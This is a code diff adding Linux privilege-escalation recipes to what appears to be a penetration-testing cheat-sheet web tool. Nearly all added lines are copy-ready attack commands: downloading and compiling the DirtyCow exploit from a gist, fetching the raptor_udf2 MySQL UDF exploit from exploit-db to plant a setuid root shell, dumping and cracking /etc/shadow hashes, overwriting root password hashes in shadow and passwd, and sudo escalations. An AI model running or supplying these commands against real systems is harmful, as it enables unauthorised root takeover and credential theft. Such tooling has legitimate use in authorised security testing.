@@ -614,8 +614,45 @@ class PrivEsc extends MyTool {
 
     this.targetContents['1'] = [
       {'title': '1. DirtyCow', 'cmd': 'wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c'},
-      {'title': '2. DirtyCow', 'cmd': 'gcc -pthread c0w.c -o c0w && ./c0w'},
-      {'title': '3. DirtyCow', 'cmd': '/usr/bin/passwd'},
+      {'title': '2. DirtyCow - compile exploit', 'cmd': 'gcc -pthread c0w.c -o c0w && ./c0w'},
+      {'title': '3. DirtyCow - priv esc', 'cmd': '/usr/bin/passwd'},
+      {'title': '1. MySQL 4.x/5.0 UDF', 'cmd': 'wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c'},
+      {'title': '2. MySQL 4.x/5.0 UDF - compile exploit', 'cmd': 'gcc -g -c raptor_udf2.c -fPIC'},
+      {'title': '3. MySQL 4.x/5.0 UDF - create shared object', 'cmd': 'gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc'},
+      {'title': '4. MySQL 4.x/5.0 UDF', 'cmd': 'mysql -u root -p'},
+      {'title': '5. MySQL 4.x/5.0 UDF', 'cmd': 'use mysql;'},
+      {'title': '6. MySQL 4.x/5.0 UDF', 'cmd': 'create table foo(line blob);'},
+      {'title': '7. MySQL 4.x/5.0 UDF', 'cmd': `insert into foo values(load_file('/tmp/raptor_udf2.so'));`},
+      {'title': '8. MySQL 4.x/5.0 UDF', 'cmd': `select * from foo into dumpfile '/usr/lib/raptor_udf2.so';`},
+      {'title': '9. MySQL 4.x/5.0 UDF - create User Defined Function', 'cmd': `create function do_system returns integer soname 'raptor_udf2.so';`},
+      {'title': '10. MySQL 4.x/5.0 UDF', 'cmd': `select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');`},
+      {'title': '11. MySQL 4.x/5.0 UDF - priv esc', 'cmd': '/tmp/rootbash -p'},
+      {'title': 'Port Forwarding', 'cmd': 'ssh -R LOCAL_PORT:127.0.0.1:TARGET_PORT USERNAME@LOCAL_MACHINE'},
+      {'title': 'Find all writable files in /etc', 'cmd': 'find /etc -maxdepth 1 -writable -type f'},
+      {'title': 'Find all readable files in /etc', 'cmd': 'find /etc -maxdepth 1 -readable -type f'},
+      {'title': 'Find all directories which can be written to', 'cmd': 'find / -executable -writable -type d 2> /dev/null'},
+      {'title': '1. /etc/shadow - Readable', 'cmd': 'ls -l /etc/shadow'},
+      {'title': '2. /etc/shadow - Readable', 'cmd': 'head -n 1 /etc/shadow | cut -d: -f2 > hash.txt'},
+      {'title': '3. /etc/shadow - Readable (@Kali)', 'cmd': 'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'},
+      {'title': '4. /etc/shadow - Readable', 'cmd': 'su', 'memo': 'Use the su command to switch to the root user, entering the password we cracked when prompted.'},
+      {'title': '1. /etc/shadow - Writable', 'cmd': 'ls -l /etc/shadow'},
+      {'title': '2. /etc/shadow - Writable', 'cmd': 'cp /etc/shadow /tmp/shadow.bak'},
+      {'title': '3. /etc/shadow - Writable (@Kali)', 'cmd': 'mkpasswd -m sha-512 "newpassword"', 'memo': 'Replace the root user\'s password hash with the one we generated.<br>root:$6$Tb/euwmK$OXA.dwMeOAcop...MdwD3B0fGxJI0:17298:0:99999:7:::'},
+      {'title': '4. /etc/shadow - Writable', 'cmd': 'su', 'memo': 'Use the su command to switch to the root user, entering the new password when prompted.'},
+      {'title': '1. /etc/passwd - Writable', 'cmd': 'ls -l /etc/passwd'},
+      {'title': '2. /etc/passwd - Writable (@Kali)', 'cmd': 'openssl passwd "newpassword"', 'memo': 'Replace the root user\'s password hash with the one we generated.<br>root:L9yLGxncbOROc:0:0:root:/root:/bin/bash'},
+      {'title': '3. /etc/passwd - Writable', 'cmd': 'su', 'memo': 'Use the su command to switch to the newroot user.'},
+      {'title': 'SSH Key (@Kali)', 'cmd': 'ssh -i ROOT_KEY root@{0}'},
+      {'title': '1. List the programs your users is allowed to run.', 'cmd': 'sudo -l'},
+      {'title': '2. Check CTFOBins', 'cmd': 'https://gtfobins.github.io/'},
+      {'title': 'sudo', 'cmd': 'sudo su'},
+      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -s'},
+      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo -i'},
+      {'title': 'sudo (When su is not allowed)', 'cmd': 'sudo /bin/bash'},
+      {'title': '', 'cmd': ''},
+      {'title': '', 'cmd': ''},
+      {'title': '', 'cmd': ''},
+      {'title': '', 'cmd': ''},
     ];
   }
 
@@ -624,6 +661,7 @@ class PrivEsc extends MyTool {
       const content = targetContent[i];
       let title = content.title;
       let cmd = content.cmd;
+      let memo = content.memo || "";
       cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
       cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
       // Template
@@ -632,6 +670,7 @@ class PrivEsc extends MyTool {
         <div class="ms-2 me-auto" style="width: 80%">
           <div class="fw-bold">${title}</div>
           <code class="copy_target">${cmd}</code>
+          ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
         </div>
         <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
       </li>
